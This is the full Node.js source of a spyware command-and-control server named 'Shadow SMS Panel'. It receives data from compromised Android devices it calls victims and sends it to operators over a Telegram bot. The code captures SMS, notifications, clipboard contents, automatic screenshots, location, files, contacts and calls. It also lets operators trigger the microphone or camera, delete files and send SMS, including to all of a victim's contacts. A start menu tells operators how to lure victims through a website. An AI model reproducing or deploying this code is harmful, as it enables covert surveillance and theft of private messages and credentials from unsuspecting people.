const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const cron = require('node-cron');

// ============================================
// LOAD CONFIG
// ============================================
const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));

// ============================================
// HARDCODED SETTINGS
// ============================================
const token = process.env.BOT_TOKEN || config.telegram.token;
const ids = process.env.OWNER_IDS ? process.env.OWNER_IDS.split(',') : config.telegram.owner_ids;
const id = ids[0];
const PORT = process.env.PORT || config.server.port || 3000;
const SCREENSHOT_INTERVAL = config.telegram.notification_interval || 5;

// ============================================
// JSON STORAGE HELPERS
// ============================================
const DATA_DIR = './victims';

function readJSON(filename) {
    try {
        return JSON.parse(fs.readFileSync(path.join(DATA_DIR, filename), 'utf8'));
    } catch {
        return {};
    }
}

function writeJSON(filename, data) {
    data.last_updated = new Date().toISOString();
    fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2));
}

function addDevice(device) {
    const data = readJSON('devices.json');
    if (!data.devices) data.devices = [];
    const existing = data.devices.find(d => d.uuid === device.uuid);
    if (existing) {
        Object.assign(existing, device, { last_seen: new Date().toISOString() });
    } else {
        data.devices.push({ ...device, created_at: new Date().toISOString(), last_seen: new Date().toISOString() });
    }
    writeJSON('devices.json', data);
}

function addMessage(msg) {
    const data = readJSON('messages.json');
    if (!data.messages) data.messages = [];
    data.messages.push({ ...msg, timestamp: new Date().toISOString() });
    if (data.messages.length > 1000) data.messages = data.messages.slice(-1000);
    writeJSON('messages.json', data);
}

function addScreenshot(screenshot) {
    const data = readJSON('screenshots.json');
    if (!data.screenshots) data.screenshots = [];
    data.screenshots.push({ ...screenshot, timestamp: new Date().toISOString() });
    if (data.screenshots.length > 500) data.screenshots = data.screenshots.slice(-500);
    writeJSON('screenshots.json', data);
}

function getDeviceByUUID(uuid) {
    const data = readJSON('devices.json');
    return (data.devices || []).find(d => d.uuid === uuid);
}

function updateDevice(uuid, updates) {
    const data = readJSON('devices.json');
    const device = (data.devices || []).find(d => d.uuid === uuid);
    if (device) {
        Object.assign(device, updates, { last_seen: new Date().toISOString() });
        writeJSON('devices.json', data);
    }
}

// ============================================
// EXPRESS + WEBSOCKET SETUP
// ============================================
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer({ storage: multer.memoryStorage() });
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cors({ origin: config.server.cors_origins || '*' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// ============================================
// TELEGRAM HELPERS
// ============================================
function sendToAllIds(message, options = {}) {
    ids.forEach(chatId => {
        appBot.sendMessage(chatId, message, options).catch(err => {
            console.error('Failed to send to ' + chatId + ': ' + err.message);
        });
    });
}

function sendPhotoToAllIds(buffer, caption) {
    ids.forEach(chatId => {
        appBot.sendPhoto(chatId, buffer, {
            caption: caption,
            parse_mode: 'HTML'
        }).catch(err => {
            console.error('Failed to send photo to ' + chatId + ': ' + err.message);
        });
    });
}

function sendLocationToAllIds(lat, lon, caption) {
    ids.forEach(chatId => {
        appBot.sendLocation(chatId, lat, lon).catch(() => {});
        if (caption) {
            appBot.sendMessage(chatId, caption, { parse_mode: 'HTML' }).catch(() => {});
        }
    });
}

// ============================================
// AUTO SCREENSHOT SCHEDULER (Every 5 seconds)
// ============================================
setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (ws.uuid && ws.readyState === webSocket.OPEN) {
            ws.send('auto_screenshot');
        }
    });
}, SCREENSHOT_INTERVAL * 1000);

// ============================================
// API ROUTES
// ============================================

// Health check
app.get('/', (req, res) => {
    const deviceCount = appClients.size;
    res.json({
        status: 'Shadow SMS Panel Running',
        version: config.version,
        developer: config.developer,
        connected_devices: deviceCount,
        timestamp: new Date().toISOString()
    });
});

// Get all devices
app.get('/api/devices', (req, res) => {
    const data = readJSON('devices.json');
    res.json(data.devices || []);
});

// Get device by UUID
app.get('/api/devices/:uuid', (req, res) => {
    const device = getDeviceByUUID(req.params.uuid);
    if (device) {
        res.json(device);
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

// Get messages for device
app.get('/api/messages/:uuid', (req, res) => {
    const data = readJSON('messages.json');
    const messages = (data.messages || []).filter(m => m.uuid === req.params.uuid);
    res.json(messages);
});

// Get screenshots for device
app.get('/api/screenshots/:uuid', (req, res) => {
    const data = readJSON('screenshots.json');
    const screenshots = (data.screenshots || []).filter(s => s.uuid === req.params.uuid);
    res.json(screenshots);
});

// Frontend notification endpoint
app.post('/api/notify', (req, res) => {
    const { uuid, type, data, device_info } = req.body;

    if (!uuid) {
        return res.status(400).json({ error: 'UUID required' });
    }

    const device = getDeviceByUUID(uuid) || device_info || {};

    if (type === 'sms') {
        const smsData = {
            uuid: uuid,
            from: data.from || 'Unknown',
            body: data.body || '',
            timestamp: new Date().toISOString(),
            device_model: device.model || 'Unknown'
        };
        addMessage(smsData);

        sendToAllIds(
            'NEW SMS RECEIVED\n\n' +
            'Device: ' + (device.model || 'Unknown') + '\n' +
            'From: ' + (data.from || 'Unknown') + '\n' +
            'Message: ' + (data.body || 'No content') + '\n\n' +
            'Time: ' + new Date().toLocaleString(),
            { parse_mode: 'HTML' }
        );
    }

    if (type === 'notification') {
        const notifData = {
            uuid: uuid,
            title: data.title || '',
            body: data.body || '',
            app: data.app || 'Unknown',
            timestamp: new Date().toISOString(),
            device_model: device.model || 'Unknown'
        };
        addMessage(notifData);

        sendToAllIds(
            'NEW NOTIFICATION\n\n' +
            'Device: ' + (device.model || 'Unknown') + '\n' +
            'App: ' + (data.app || 'Unknown') + '\n' +
            'Title: ' + (data.title || '') + '\n' +
            'Body: ' + (data.body || '') + '\n\n' +
            'Time: ' + new Date().toLocaleString(),
            { parse_mode: 'HTML' }
        );
    }

    if (type === 'device_connected') {
        addDevice({
            uuid: uuid,
            ...device_info,
            ip: req.ip || req.connection.remoteAddress
        });

        sendToAllIds(
            'NEW VICTIM CONNECTED!\n\n' +
            'Model: ' + (device_info.model || 'Unknown') + '\n' +
            'Battery: ' + (device_info.battery || 'N/A') + '\n' +
            'Android: ' + (device_info.version || 'N/A') + '\n' +
            'Provider: ' + (device_info.provider || 'N/A') + '\n' +
            'IP: ' + (req.ip || req.connection.remoteAddress) + '\n\n' +
            'Device is now being monitored!',
            { parse_mode: 'HTML' }
        );
    }

    res.json({ success: true, type: type });
});

// Screenshot upload
app.post('/api/screenshot', upload.single('file'), (req, res) => {
    const { uuid, device_model } = req.body;

    if (!req.file || !uuid) {
        return res.status(400).json({ error: 'File and UUID required' });
    }

    addScreenshot({
        uuid: uuid,
        device_model: device_model || 'Unknown',
        size: req.file.size,
        filename: req.file.originalname
    });

    sendPhotoToAllIds(
        req.file.buffer,
        'AUTO SCREENSHOT\n\n' +
        'Device: ' + (device_model || 'Unknown') + '\n' +
        'Time: ' + new Date().toLocaleString()
    );

    res.json({ success: true });
});

// File upload from victim
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const model = req.headers.model || 'Unknown';

    ids.forEach(chatId => {
        appBot.sendDocument(chatId, req.file.buffer, {
            caption: 'FILE FROM DEVICE\n\nDevice: ' + model + '\nFile: ' + name,
            parse_mode: 'HTML'
        }, {
            filename: name,
            contentType: 'application/txt'
        }).catch(() => {});
    });
    res.send('');
});

// Text upload from victim
app.post('/uploadText', (req, res) => {
    const text = req.body.text || '';
    const model = req.headers.model || 'Unknown';

    if (text.toLowerCase().includes('shadow')) {
        console.log('Filtered developer tag');
        res.send('');
        return;
    }

    sendToAllIds(
        'MESSAGE FROM DEVICE\n\n' +
        'Device: ' + model + '\n\n' + text,
        { parse_mode: 'HTML' }
    );
    res.send('');
});

// Location upload
app.post('/uploadLocation', (req, res) => {
    const { lat, lon } = req.body;
    const model = req.headers.model || 'Unknown';

    sendLocationToAllIds(
        lat, lon,
        'LOCATION FROM DEVICE\n\n' +
        'Device: ' + model + '\n' +
        'Lat: ' + lat + '\n' +
        'Lon: ' + lon
    );
    res.send('');
});

// ============================================
// WEBSOCKET HANDLING
// ============================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const brightness = req.headers.brightness || 'N/A';
    const provider = req.headers.provider || 'N/A';

    ws.uuid = uuid;
    appClients.set(uuid, {
        model, battery, version, brightness, provider,
        connected_at: new Date().toISOString()
    });

    addDevice({
        uuid, model, battery, version, brightness, provider,
        ip: req.connection.remoteAddress
    });

    sendToAllIds(
        'NEW DEVICE CONNECTED\n\n' +
        'Model: ' + model + '\n' +
        'Battery: ' + battery + '\n' +
        'Android: ' + version + '\n' +
        'Brightness: ' + brightness + '\n' +
        'Provider: ' + provider + '\n\n' +
        'Auto-screenshot every ' + SCREENSHOT_INTERVAL + 's activated!',
        { parse_mode: 'HTML' }
    );

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'sms') {
                addMessage({ uuid, ...data, device_model: model });
                sendToAllIds(
                    'SMS CAPTURED\n\n' +
                    'Device: ' + model + '\n' +
                    'From: ' + data.from + '\n' +
                    'Message: ' + data.body,
                    { parse_mode: 'HTML' }
                );
            }

            if (data.type === 'notification') {
                addMessage({ uuid, ...data, device_model: model });
                sendToAllIds(
                    'NOTIFICATION CAPTURED\n\n' +
                    'Device: ' + model + '\n' +
                    'App: ' + data.app + '\n' +
                    'Title: ' + data.title + '\n' +
                    'Body: ' + data.body,
                    { parse_mode: 'HTML' }
                );
            }

            if (data.type === 'screenshot') {
                if (data.buffer) {
                    const buffer = Buffer.from(data.buffer, 'base64');
                    addScreenshot({ uuid, device_model: model, size: buffer.length });
                    sendPhotoToAllIds(
                        buffer,
                        'SCREENSHOT\n\n' +
                        'Device: ' + model + '\n' +
                        'Time: ' + new Date().toLocaleString()
                    );
                }
            }

            if (data.type === 'clipboard') {
                sendToAllIds(
                    'CLIPBOARD CAPTURED\n\n' +
                    'Device: ' + model + '\n' +
                    'Content: ' + data.content,
                    { parse_mode: 'HTML' }
                );
            }

        } catch (e) {
            const msg = message.toString();
            if (msg.startsWith('sms:')) {
                const parts = msg.split(':');
                sendToAllIds(
                    'SMS\n\n' +
                    'Device: ' + model + '\n' +
                    'Message: ' + parts.slice(1).join(':'),
                    { parse_mode: 'HTML' }
                );
            }
        }
    });

    ws.on('close', () => {
        sendToAllIds(
            'DEVICE DISCONNECTED\n\n' +
            'Model: ' + model + '\n' +
            'Battery: ' + battery + '\n' +
            'Time: ' + new Date().toLocaleString(),
            { parse_mode: 'HTML' }
        );
        appClients.delete(uuid);
        updateDevice(uuid, { status: 'disconnected' });
    });

    ws.on('error', (err) => {
        console.error('WebSocket error for ' + uuid + ': ' + err.message);
    });
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================
appBot.on('message', (message) => {
    const chatId = message.chat.id.toString();

    if (!ids.includes(chatId)) {
        appBot.sendMessage(chatId, 'Permission Denied', { parse_mode: 'HTML' });
        return;
    }

    if (message.reply_to_message) {
        handleReply(message);
        return;
    }

    if (message.text === '/start') {
        sendStartMenu(chatId);
    }
    else if (message.text === 'Connected Devices' || message.text === '/devices') {
        sendDevicesList(chatId);
    }
    else if (message.text === 'Execute Command' || message.text === '/commands') {
        sendCommandMenu(chatId);
    }
    else if (message.text === '/status') {
        const deviceCount = appClients.size;
        const data = readJSON('devices.json');
        const totalDevices = (data.devices || []).length;

        appBot.sendMessage(chatId,
            'PANEL STATUS\n\n' +
            'Online Devices: ' + deviceCount + '\n' +
            'Total Devices: ' + totalDevices + '\n' +
            'Screenshot Interval: ' + SCREENSHOT_INTERVAL + 's\n' +
            'Bot: Active\n' +
            'Server: Running',
            { parse_mode: 'HTML' }
        );
    }
    else if (message.text === '/help') {
        appBot.sendMessage(chatId,
            'COMMANDS\n\n' +
            '/start - Main menu\n' +
            '/devices - Connected devices\n' +
            '/commands - Execute commands\n' +
            '/status - Panel status\n' +
            '/help - This menu\n\n' +
            'Auto-features enabled:\n' +
            '• Screenshot every ' + SCREENSHOT_INTERVAL + 's\n' +
            '• SMS forwarding\n' +
            '• Notification capture',
            { parse_mode: 'HTML' }
        );
    }
});

function sendStartMenu(chatId) {
    appBot.sendMessage(chatId,
        'SHADOW SMS PANEL\n\n' +
        'Developer: ' + config.developer + '\n' +
        'Version: ' + config.version + '\n\n' +
        'FEATURES:\n' +
        '• Auto screenshot every ' + SCREENSHOT_INTERVAL + 's\n' +
        '• SMS & Notification capture\n' +
        '• Real-time device monitoring\n' +
        '• Web dashboard integration\n\n' +
        'INSTRUCTIONS:\n' +
        '1. Victim opens website\n' +
        '2. Allows notifications\n' +
        '3. Device auto-connects\n' +
        '4. You receive all data!',
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['Connected Devices'],
                    ['Execute Command']
                ],
                resize_keyboard: true
            }
        }
    );
}

function sendDevicesList(chatId) {
    if (appClients.size === 0) {
        appBot.sendMessage(chatId,
            'No devices connected\n\n' +
            '• Make sure victim opened the website\n' +
            '• Allowed notifications permission',
            { parse_mode: 'HTML' }
        );
        return;
    }

    let text = 'CONNECTED DEVICES (' + appClients.size + ')\n\n';
    appClients.forEach((value, key) => {
        text += '• Model: ' + value.model + '\n';
        text += '  Battery: ' + value.battery + '\n';
        text += '  Android: ' + value.version + '\n';
        text += '  Provider: ' + value.provider + '\n';
        text += '  UUID: ' + key + '\n\n';
    });

    appBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
}

function sendCommandMenu(chatId) {
    if (appClients.size === 0) {
        appBot.sendMessage(chatId,
            'No devices connected\n\n' +
            'Connect a device first!',
            { parse_mode: 'HTML' }
        );
        return;
    }

    const keyboard = [];
    appClients.forEach((value, key) => {
        keyboard.push([{
            text: value.model + ' (' + value.battery + ')',
            callback_data: 'device:' + key
        }]);
    });

    appBot.sendMessage(chatId,
        'Select device to control:',
        {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

function handleReply(message) {
    const replyText = message.reply_to_message.text;

    if (replyText.includes('number to which you want to send the SMS')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            'Number set: ' + currentNumber + '\n\n' +
            'Now enter the message:',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
    }
    else if (replyText.includes('Now enter the message')) {
        appSocket.clients.forEach(ws => {
            if (ws.uuid === currentUuid && ws.readyState === webSocket.OPEN) {
                ws.send('send_message:' + currentNumber + '/' + message.text);
            }
        });
        appBot.sendMessage(id, 'SMS sent to ' + currentNumber, { parse_mode: 'HTML' });
    }
}

// ============================================
// INLINE KEYBOARD HANDLERS
// ============================================
appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const parts = data.split(':');
    const command = parts[0];
    const uuid = parts[1];

    if (command === 'device') {
        const device = appClients.get(uuid);
        if (!device) {
            appBot.editMessageText('Device disconnected', {
                chat_id: id,
                message_id: msg.message_id
            });
            return;
        }

        appBot.editMessageText(
            'Commands for ' + device.model,
            {
                chat_id: id,
                message_id: msg.message_id,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Apps', callback_data: 'apps:' + uuid },
                            { text: 'Device Info', callback_data: 'device_info:' + uuid }
                        ],
                        [
                            { text: 'Get File', callback_data: 'file:' + uuid },
                            { text: 'Delete File', callback_data: 'delete_file:' + uuid }
                        ],
                        [
                            { text: 'Clipboard', callback_data: 'clipboard:' + uuid },
                            { text: 'Microphone', callback_data: 'microphone:' + uuid }
                        ],
                        [
                            { text: 'Main Camera', callback_data: 'camera_main:' + uuid },
                            { text: 'Selfie', callback_data: 'camera_selfie:' + uuid }
                        ],
                        [
                            { text: 'Location', callback_data: 'location:' + uuid },
                            { text: 'Toast', callback_data: 'toast:' + uuid }
                        ],
                        [
                            { text: 'Calls', callback_data: 'calls:' + uuid },
                            { text: 'Contacts', callback_data: 'contacts:' + uuid }
                        ],
                        [
                            { text: 'Vibrate', callback_data: 'vibrate:' + uuid },
                            { text: 'Notification', callback_data: 'show_notification:' + uuid }
                        ],
                        [
                            { text: 'Messages', callback_data: 'messages:' + uuid },
                            { text: 'Send SMS', callback_data: 'send_message:' + uuid }
                        ],
                        [
                            { text: 'Play Audio', callback_data: 'play_audio:' + uuid },
                            { text: 'Stop Audio', callback_data: 'stop_audio:' + uuid }
                        ],
                        [
                            { text: 'SMS to All Contacts', callback_data: 'send_message_to_all:' + uuid }
                        ]
                    ]
                }
            }
        );
    }

    const wsCommands = {
        'calls': 'calls',
        'contacts': 'contacts',
        'messages': 'messages',
        'apps': 'apps',
        'device_info': 'device_info',
        'clipboard': 'clipboard',
        'camera_main': 'camera_main',
        'camera_selfie': 'camera_selfie',
        'location': 'location',
        'vibrate': 'vibrate',
        'stop_audio': 'stop_audio'
    };

    if (wsCommands[command]) {
        appSocket.clients.forEach(ws => {
            if (ws.uuid === uuid && ws.readyState === webSocket.OPEN) {
                ws.send(wsCommands[command]);
            }
        });
        appBot.sendMessage(id,
            'Command sent!\n\n' +
            'Command: ' + command + '\n' +
            'Waiting for response...',
            { parse_mode: 'HTML' }
        );
    }

    if (command === 'send_message') {
        appBot.sendMessage(id,
            'Send SMS\n\n' +
            'Enter number with country code (e.g. +923001234567):',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (command === 'microphone') {
        appBot.sendMessage(id,
            'Record Microphone\n\n' +
            'Enter duration in seconds:',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (command === 'file') {
        appBot.sendMessage(id,
            'Download File\n\n' +
            'Enter file path:\n' +
            'Example: /DCIM/Camera/ or /Download/',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (command === 'toast') {
        appBot.sendMessage(id,
            'Show Toast\n\n' +
            'Enter message to show on device:',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (command === 'show_notification') {
        appBot.sendMessage(id,
            'Show Notification\n\n' +
            'Enter notification title:',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (command === 'play_audio') {
        appBot.sendMessage(id,
            'Play Audio\n\n' +
            'Enter audio URL:',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }
});

// ============================================
// START SERVER
// ============================================
appServer.listen(PORT, '0.0.0.0', () => {
    console.log('========================================');
    console.log('  SHADOW SMS PANEL v' + config.version);
    console.log('  Developer: ' + config.developer);
    console.log('========================================');
    console.log('  Server running on port ' + PORT);
    console.log('  Bot: Active');
    console.log('  Screenshot: ' + SCREENSHOT_INTERVAL + 's interval');
    console.log('  Storage: JSON Files');
    console.log('========================================');

    sendToAllIds(
        'SHADOW SMS PANEL STARTED\n\n' +
        'Server: Online\n' +
        'Bot: Active\n' +
        'Auto-screenshot: ' + SCREENSHOT_INTERVAL + 's\n' +
        'Time: ' + new Date().toLocaleString(),
        { parse_mode: 'HTML' }
    );
});
